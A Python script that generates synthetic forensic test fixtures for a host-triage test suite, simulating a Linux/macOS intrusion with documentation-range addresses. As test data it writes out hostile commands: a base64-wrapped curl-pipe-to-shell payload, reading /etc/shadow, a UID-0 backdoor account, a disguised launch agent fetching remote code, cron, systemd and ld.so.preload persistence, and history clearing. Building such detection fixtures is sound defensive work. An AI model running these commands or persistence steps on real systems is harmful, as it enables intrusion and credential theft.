#!/usr/bin/env python3
"""Writes the synthetic fixtures of tests/test_tk_nix_host.py next to this file. Deterministic:
run it again and git shows no change. Nothing here is real evidence; every address is from the
documentation ranges (RFC 5737), every host and account is made up.

  .venv/bin/python tests/fixtures/tk_nix_host/make_fixtures.py

`DS_Store` (committed, not written here) was made once with the `ds_store` package (1.3.3, an
independent writer, installed outside the repo's .venv):
    with DSStore.open(path, "w+") as d:
        d["notes.txt"]["Iloc"] = (10, 20); d["payload.sh"]["Iloc"] = (30, 40)
        d[".hidden_loader"]["Iloc"] = (50, 60); d["Invoice 2026.pdf"]["Iloc"] = (70, 80)
"""
import base64
import plistlib
import struct
from datetime import datetime, timezone
from pathlib import Path

HERE = Path(__file__).resolve().parent
LOGIN = int(datetime(2026, 10, 8, 3, 14, 27, tzinfo=timezone.utc).timestamp())      # the attacker's login
ATTACKER, NOISE, ADMIN = "203.0.113.77", "192.0.2.50", "198.51.100.20"
PAYLOAD = "curl -s http://198.51.100.9/stage2.sh | sh"
INNER = "echo " + base64.b64encode(PAYLOAD.encode()).decode() + " | base64 -d | sh"


def stamp(seconds):
    d = datetime.fromtimestamp(seconds, timezone.utc)
    return f"{d.strftime('%b')} {d.day:2d} {d.strftime('%H:%M:%S')}"


def auth_log() -> str:
    t = LOGIN - 300
    out = [f"{stamp(t - 3600)} web01 sshd[702]: Accepted publickey for alice from {ADMIN} port 50211 ssh2: ED25519 SHA256:n0tAr3alK3yn0tAr3alK3yn0tAr3alK3yn0tAr3alK3y0",
           f"{stamp(t - 3600)} web01 sshd[702]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)",
           f"{stamp(t - 3000)} web01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl status nginx",
           f"{stamp(t - 2400)} web01 CRON[744]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)",
           f"{stamp(t - 2400)} web01 CRON[745]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)"]
    for n, user in enumerate(("admin", "test", "oracle", "ubuntu")):                # four failures from a noise source
        out.append(f"{stamp(t - 1200 + n * 3)} web01 sshd[{800 + n}]: Invalid user {user} from {NOISE} port {41000 + n}")
        out.append(f"{stamp(t - 1200 + n * 3 + 1)} web01 sshd[{800 + n}]: Failed password for invalid user {user} from {NOISE} port {41000 + n} ssh2")
    for n in range(12):                                                             # twelve lines, and three more repeated
        user = ("root", "root", "deploy", "root", "admin", "deploy")[n % 6]
        if user == "admin":
            out.append(f"{stamp(t + n * 20)} web01 sshd[{900 + n}]: Invalid user admin from {ATTACKER} port {52000 + n}")
            out.append(f"{stamp(t + n * 20 + 1)} web01 sshd[{900 + n}]: Failed password for invalid user admin from {ATTACKER} port {52000 + n} ssh2")
        else:
            out.append(f"{stamp(t + n * 20 + 1)} web01 sshd[{900 + n}]: Failed password for {user} from {ATTACKER} port {52000 + n} ssh2")
    out.append(f"{stamp(t + 250)} web01 sshd[911]: message repeated 3 times: [ Failed password for deploy from {ATTACKER} port 52011 ssh2]")
    out.append(f"{stamp(t + 260)} web01 sshd[911]: error: maximum authentication attempts exceeded for deploy from {ATTACKER} port 52011 ssh2 [preauth]")
    out += [f"{stamp(LOGIN)} web01 sshd[930]: Accepted password for deploy from {ATTACKER} port 52040 ssh2",
            f"{stamp(LOGIN)} web01 sshd[930]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)",
            f"{stamp(LOGIN + 41)} web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
            f"{stamp(LOGIN + 95)} web01 useradd[977]: new group: name=sysupd, GID=1002",
            f"{stamp(LOGIN + 95)} web01 useradd[977]: new user: name=sysupd, UID=0, GID=0, home=/var/lib/sysupd, shell=/bin/bash, from=/dev/pts/1",
            f"{stamp(LOGIN + 96)} web01 usermod[981]: add 'sysupd' to group 'sudo'",
            f"{stamp(LOGIN + 97)} web01 passwd[983]: pam_unix(passwd:chauthtok): password changed for sysupd",
            f"{stamp(LOGIN + 600)} web01 sshd[930]: pam_unix(sshd:session): session closed for user deploy"]
    return "\n".join(out) + "\n"


def audit_log() -> str:
    t = LOGIN + 130

    def hx(text):
        return text.encode().hex().upper()

    saddr = (struct.pack("<H", 2) + struct.pack(">H", 80) + bytes((198, 51, 100, 9)) + b"\x00" * 8).hex().upper()
    sys59 = "arch=c000003e syscall=59 success=yes exit=0 a0=55d0c1 a1=55d0c2 a2=55d0c3 a3=8 items=2"
    who = "auid=1001 uid=0 gid=0 euid=0 tty=pts1 ses=7"
    lines = [
        f"type=USER_LOGIN msg=audit({LOGIN}.412:1201): pid=930 uid=0 auid=1001 ses=7 msg='op=login id=1001 exe=\"/usr/sbin/sshd\" "
        f"hostname={ATTACKER} addr={ATTACKER} terminal=/dev/pts/1 res=success'",
        f"type=SYSCALL msg=audit({t}.101:1210): {sys59} ppid=931 pid=1040 {who} comm=\"ls\" exe=\"/usr/bin/ls\" key=\"exec_log\"",
        f"type=EXECVE msg=audit({t}.101:1210): argc=2 a0=\"ls\" a1=\"-la\"",
        f"type=CWD msg=audit({t}.101:1210): cwd=\"/home/deploy\"",
        f"type=PROCTITLE msg=audit({t}.101:1210): proctitle={hx('ls') + '00' + hx('-la')}",
        f"type=SYSCALL msg=audit({t + 9}.530:1214): {sys59} ppid=931 pid=1047 {who} comm=\"bash\" exe=\"/usr/bin/bash\" key=\"susp_exec\"",
        f"type=EXECVE msg=audit({t + 9}.530:1214): argc=3 a0=\"bash\" a1=\"-c\" a2={hx(INNER)}",
        f"type=CWD msg=audit({t + 9}.530:1214): cwd=\"/tmp\"",
        f"type=PROCTITLE msg=audit({t + 9}.530:1214): proctitle={hx('bash') + '00' + hx('-c') + '00' + hx(INNER)}",
        f"type=SYSCALL msg=audit({t + 10}.002:1215): arch=c000003e syscall=42 success=yes exit=0 a0=3 a1=7ffd0 a2=10 a3=0 items=0 "
        f"ppid=1047 pid=1049 {who} comm=\"curl\" exe=\"/usr/bin/curl\" key=\"net_out\"",
        f"type=SOCKADDR msg=audit({t + 10}.002:1215): saddr={saddr}",
    ]
    return "\n".join(lines) + "\n"


def utmp_record(kind, pid=0, line="", id_="", user="", host="", sec=0, usec=0, addr=None) -> bytes:
    raw = bytes(int(p) for p in addr.split(".")) + b"\x00" * 12 if addr else b"\x00" * 16
    return struct.pack("<hxxi32s4s32s256shhiii16s20s", kind, pid, line.encode(), id_.encode(), user.encode(), host.encode(),
                       0, 0, 0, sec, usec, raw, b"")


def wtmp() -> bytes:
    return b"".join([
        utmp_record(2, 0, "~", "~~", "reboot", "6.8.0-45-generic", LOGIN - 86400, 100),
        utmp_record(1, 53, "~", "~~", "runlevel", "6.8.0-45-generic", LOGIN - 86380, 0),
        utmp_record(7, 702, "pts/0", "ts/0", "alice", ADMIN, LOGIN - 3900, 512000, ADMIN),
        utmp_record(7, 930, "pts/1", "ts/1", "deploy", ATTACKER, LOGIN, 733000, ATTACKER),
        utmp_record(8, 930, "pts/1", "ts/1", "", "", LOGIN + 600, 0),
        utmp_record(8, 702, "pts/0", "ts/0", "", "", LOGIN + 4000, 0),
    ])


def btmp() -> bytes:
    return b"".join(utmp_record(6, 900 + n, "ssh:notty", "", ("root", "deploy", "admin")[n % 3], ATTACKER, LOGIN - 300 + n * 20, 0, ATTACKER)
                    for n in range(5))


LAUNCH_AGENT = {"Label": "com.apple.softwareupdate.helper", "ProgramArguments": ["/bin/sh", "-c", "curl -s http://198.51.100.9/a | sh"],
                "RunAtLoad": True, "StartInterval": 300, "StandardOutPath": "/dev/null"}
LAUNCH_DAEMON = {"Label": "com.acme.backupd", "Program": "/usr/local/bin/backupd", "ProgramArguments": ["/usr/local/bin/backupd", "--nightly"],
                 "RunAtLoad": False, "KeepAlive": True, "UserName": "root"}


def keyed_archive(fmt=plistlib.FMT_XML) -> bytes:
    """An NSKeyedArchiver archive. In XML a reference is a {'CF$UID': n} dict; in the binary form
    it is a UID object."""
    def u(n):
        return {"CF$UID": n} if fmt == plistlib.FMT_XML else plistlib.UID(n)
    objects = ["$null",
               {"$class": u(8), "NS.keys": [u(2), u(3), u(4)], "NS.objects": [u(5), u(6), u(9)]},
               "path", "arguments", "added",
               "/Users/Shared/.cache/loader",
               {"$class": u(7), "NS.objects": [u(10), u(11)]},
               {"$classname": "NSArray", "$classes": ["NSArray", "NSObject"]},
               {"$classname": "NSDictionary", "$classes": ["NSDictionary", "NSObject"]},
               {"$class": u(12), "NS.time": float(LOGIN - 978307200)},
               "--silent", "--interval=300",
               {"$classname": "NSDate", "$classes": ["NSDate", "NSObject"]}]
    return plistlib.dumps({"$version": 100000, "$archiver": "NSKeyedArchiver", "$top": {"root": u(1)}, "$objects": objects}, fmt=fmt)


CRONTAB = """# m h dom mon dow command
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/10 * * * * /usr/local/bin/.sysupd --quiet
"""

UNIT = """[Unit]
Description=System Update Helper
After=network-online.target

[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/.sysupd --daemon --interval 600
Restart=always

[Install]
WantedBy=multi-user.target
"""

PASSWD = """root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
alice:x:1000:1000:Alice,,,:/home/alice:/bin/bash
deploy:x:1001:1001::/home/deploy:/bin/bash
sysupd:x:0:0::/var/lib/sysupd:/bin/bash
"""

HISTORY = f"""#{LOGIN + 20}
id
#{LOGIN + 41}
sudo cat /etc/shadow
#{LOGIN + 139}
{INNER}
#{LOGIN + 200}
history -c
"""


def build() -> dict:
    return {"auth.log": auth_log().encode(), "audit.log": audit_log().encode(), "wtmp": wtmp(), "btmp": btmp(),
            "com.apple.softwareupdate.helper.plist": plistlib.dumps(LAUNCH_AGENT, fmt=plistlib.FMT_XML),
            "com.acme.backupd.plist": plistlib.dumps(LAUNCH_DAEMON, fmt=plistlib.FMT_BINARY),
            "loginitems.plist": keyed_archive(plistlib.FMT_XML),
            "crontab": CRONTAB.encode(), "sysupd.service": UNIT.encode(), "passwd": PASSWD.encode(),
            "ld.so.preload": b"/usr/local/lib/libsysupd.so\n", "bash_history": HISTORY.encode()}


def main() -> int:
    out = build()
    for name, data in out.items():
        (HERE / name).write_bytes(data)
    print(f"wrote {len(out)} fixtures, {sum(len(d) for d in out.values())} bytes, under {HERE}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
